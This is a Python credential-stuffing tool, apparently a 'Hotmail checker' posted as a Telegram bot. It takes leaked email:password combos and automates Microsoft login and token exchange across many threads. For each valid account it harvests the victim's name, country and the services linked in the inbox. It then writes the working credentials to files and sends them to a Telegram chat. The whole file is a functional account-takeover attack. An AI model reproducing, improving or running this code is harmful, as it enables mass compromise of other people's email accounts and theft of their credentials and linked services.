import time
import uuid
import pycountry
import requests
import threading
import concurrent.futures
import random
import re
import os
from threading import Lock

lock = Lock()
hit = bad = retry = processed = total_combos = 0
linked_accounts = {}
checked_accounts = set()
rate_limit_semaphore = threading.BoundedSemaphore(500)

def create_progress_bar(percentage, length=25):
    filled = int(length * percentage / 100)
    bar = "█" * filled + "░" * (length - filled)
    return f"[{bar}] {percentage:.1f}%"

def get_flag(country_name):
    try:
        country = pycountry.countries.lookup(country_name)
        return ''.join(chr(127397 + ord(c)) for c in country.alpha_2)
    except:
        return '🏳'

def save_account_by_type(service_name, email, password, services):
    if service_name not in services:
        return
    if not os.path.exists("Accounts"):
        os.makedirs("Accounts")
    filename = os.path.join("Accounts", services[service_name]["file"])
    account_line = f"{email}:{password}\n"
    
    # Avoid duplicate writes
    try:
        with open(filename, 'r', encoding='utf-8') as f:
            if account_line in f.readlines():
                return
    except:
        pass
    
    with open(filename, 'a', encoding='utf-8') as f:
        f.write(account_line)
    
    with lock:
        linked_accounts[service_name] = linked_accounts.get(service_name, 0) + 1

def get_capture(email, password, token, cid, bot, chat_id, services):
    global hit
    try:
        headers = {
            "User-Agent": "Outlook-Android/2.0",
            "Authorization": f"Bearer {token}",
            "X-AnchorMailbox": f"CID:{cid}"
        }
        profile = requests.get(
            "https://substrate.office.com/profileb2/v2.0/me/V1Profile",
            headers=headers, timeout=20
        ).json()

        name = profile.get('names', [{}])[0].get('displayName', 'Unknown')
        country = profile.get('accounts', [{}])[0].get('location', 'Unknown')
        flag = get_flag(country)

        # Inbox check
        inbox_url = f"https://outlook.live.com/owa/{email}/startupdata.ashx?app=Mini&n=0"
        inbox_headers = {
            "Host": "outlook.live.com",
            "authorization": f"Bearer {token}",
            "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G975N) AppleWebKit/537.36",
            "x-owa-sessionid": cid
        }
        inbox_response = requests.post(inbox_url, headers=inbox_headers, data="", timeout=20).text

        linked_services = []
        for service_name, info in services.items():
            if info["sender"] in inbox_response:
                linked_services.append(f"✔ {service_name}")
                save_account_by_type(service_name, email, password, services)

        linked_str = "\n".join(linked_services) if linked_services else "No linked services found"

        capture = f"""
🔱 HOTMAİL HÍT BULUNDU 🔱
⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊
📧 Email: {email}
🔑 Password: {password}
👤 Name: {name}
🌍 Country: {flag} {country}
⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊
🔗 EMAIL IN INBOX:
{linked_str}

📊 Toplam Hit: {hit + 1}
⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊
𝑷𝑹𝑶𝑮𝑹𝑨𝑴 : @HotmailCheckerV1_BBOT
"""
        bot.send_message(chat_id=chat_id, text=capture.strip(), parse_mode='HTML')

        with open('Hotmail-Hits.txt', 'a', encoding='utf-8') as f:
            f.write(capture + "\n" + "="*60 + "\n")

        with lock:
            hit += 1
            processed += 1
    except Exception as e:
        print(f"[Capture Error] {e}")
        with lock:
            processed += 1

def check_account(email, password):
    try:
        session = requests.Session()
        # Step 1: Get IDP
        r1 = session.get(
            f"https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress={email}",
            headers={"User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9)"},
            timeout=15
        )
        if any(x in r1.text for x in ["Neither", "Both", "Placeholder", "OrgId"]) or "MSAccount" not in r1.text:
            return {"status": "BAD"}

        # Step 2: Login flow
        r2 = session.get(
            f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint={email}&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D",
            headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"},
            timeout=15
        )

        url_match = re.search(r'urlPost":"([^"]+)"', r2.text)
        ppft_match = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', r2.text)
        if not url_match or not ppft_match:
            return {"status": "BAD"}

        post_url = url_match.group(1).replace("\\/", "/")
        ppft = ppft_match.group(1)

        login_data = f"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1&passwd={password}&ps=2&PPFT={ppft}&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&i19=9960"

        r3 = session.post(
            post_url, 
            data=login_data,
            headers={
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Origin": "https://login.live.com",
                "Referer": r2.url
            },
            allow_redirects=False,
            timeout=15
        )

        if any(x in r3.text.lower() for x in ["incorrect", "invalid", "error"]):
            return {"status": "BAD"}

        location = r3.headers.get("Location", "")
        if not location:
            return {"status": "BAD"}

        code_match = re.search(r'code=([^&]+)', location)
        if not code_match:
            return {"status": "BAD"}

        code = code_match.group(1)

        token_data = {
            "client_info": "1",
            "client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59",
            "redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D",
            "grant_type": "authorization_code",
            "code": code,
            "scope": "profile openid offline_access https://outlook.office.com/M365.Access"
        }

        r4 = session.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token", data=token_data, timeout=15)
        if r4.status_code != 200 or "access_token" not in r4.text:
            return {"status": "BAD"}

        access_token = r4.json()["access_token"]
        mspcid = next((cookie.value for cookie in session.cookies if cookie.name == "MSPCID"), None)
        cid = mspcid.upper() if mspcid else str(uuid.uuid4()).upper()

        return {"status": "HIT", "token": access_token, "cid": cid}

    except requests.exceptions.Timeout:
        return {"status": "RETRY"}
    except Exception:
        return {"status": "RETRY"}

def check_combo(email, password, bot, chat_id, services):
    global hit, bad, retry, processed
    account_id = f"{email}:{password}"
    if account_id in checked_accounts:
        with lock:
            processed += 1
        return
    checked_accounts.add(account_id)

    with rate_limit_semaphore:
        time.sleep(random.uniform(0.01, 0.05))
        result = check_account(email, password)
        with lock:
            if result.get("status") == "HIT":
                get_capture(email, password, result.get("token"), result.get("cid"), bot, chat_id, services)
            elif result.get("status") == "BAD":
                bad += 1
            else:
                retry += 1
            processed += 1

def run_checker(bot, chat_id, threads, services):
    global total_combos, processed, hit, bad, retry, linked_accounts, progress_message_id
    print(f"[INFO] Checker started with {threads} threads")
    hit = bad = retry = processed = 0
    linked_accounts.clear()
    checked_accounts.clear()
    progress_message_id = None

    try:
        with open("combo.txt", "r", encoding="utf-8", errors="ignore") as f:
            lines = [line.strip() for line in f if ":" in line]
        total_combos = len(lines)
    except Exception as e:
        print(f"[ERROR] Failed to read combo.txt: {e}")
        send_message_safe(bot, chat_id, "❌ Error reading combo file!")
        return

    send_message_safe(bot, chat_id, f"📊 Total combos: {total_combos}\nStarting check...")

    # Start progress bar thread
    progress_thread = threading.Thread(target=update_progress_message, args=(bot, chat_id), daemon=True)
    progress_thread.start()

    print(f"[INFO] Launching {threads} worker threads...")
    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
        for line in lines:
            try:
                email, pw = line.split(":", 1)
                executor.submit(check_combo, email.strip(), pw.strip(), bot, chat_id, services)
            except:
                continue

    time.sleep(5)
    send_message_safe(bot, chat_id, f"✅ Check Completed!\nTotal Hits: {hit} | Bad: {bad} | Retries: {retry}")
    print("[INFO] Checker finished successfully")